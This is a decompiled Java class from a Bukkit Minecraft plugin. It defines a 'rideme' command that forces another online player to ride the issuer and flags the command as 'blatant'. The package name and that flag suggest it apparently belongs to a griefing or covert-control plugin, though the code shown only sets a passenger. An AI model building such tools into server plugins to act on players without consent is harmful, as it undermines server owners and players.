/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Entity
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;

public class RidemeCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("rideme <player>"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else if (target.getName().equals(p2.getName())) {
                p2.sendMessage(Settings.PREFIX("You cannot make yourself ride yourself!"));
            } else {
                p2.setPassenger((Entity)target);
                p2.sendMessage(Settings.RED + Settings.PREFIX(target.getName() + Settings.WHITE + " is now riding you!"));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

